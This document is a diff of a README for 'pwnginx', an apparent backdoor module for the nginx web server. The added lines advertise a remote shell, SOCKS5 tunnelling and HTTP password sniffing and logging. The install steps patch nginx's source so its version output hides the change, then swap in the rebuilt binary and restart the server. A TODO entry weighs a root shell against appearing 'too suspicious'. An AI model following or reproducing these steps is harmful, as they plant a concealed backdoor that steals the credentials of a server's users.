@@ -15,6 +15,14 @@ Get a socks5 tunnel listening at [socks5ip]:[socks5port]
     ./pwnginx socks5 [ip] [port] [socks5ip] [socks5port]
 
 
+###Features:
+    
+* Remote shell access
+
+* Socks5 tunneling via existing http connection
+
+* Http password sniffing & logging
+
 ###INSTALL:
 
 * Compile the client:
@@ -25,17 +33,21 @@ Get a socks5 tunnel listening at [socks5ip]:[socks5port]
 
     $ vim src/core/nginx.c
     
-    Modify the `configure arguments` line into: "configure arguments: --prefix=/opt/nginx\n");
+    Modify the `configure arguments` line into: `configure arguments: --prefix=/opt/nginx\n");` (original configure arguments shown in the result of `nginx -V`)
 
-* Recompile the nginx:
+* Recompile nginx:
 
-    $ cd /path/to/nginx/source; ./configure --prefix=/opt/nginx --add-module=/path/to/pwnginx/module && make && make install
+    $ cd /path/to/nginx/source; ./configure --prefix=/opt/nginx --add-module=/path/to/pwnginx/module && make (There is no need to run `make install`)
+    $ sudo cp -f objs/nginx /path/to/nginx/sbin/nginx
+
+* Restart nginx
+    $ sudo killall nginx && /path/to/nginx/sbin/nginx
 
 
 ###TODO:
 
 * Pack communication traffic into HTTP protocol
 
-* http password sniff
-
 * Full pty support
+
+* Shell with root privilege(? There must be another stand-alone 'nginx: master process' running under root to support this function. Maybe that's too suspicious. Being considered.)
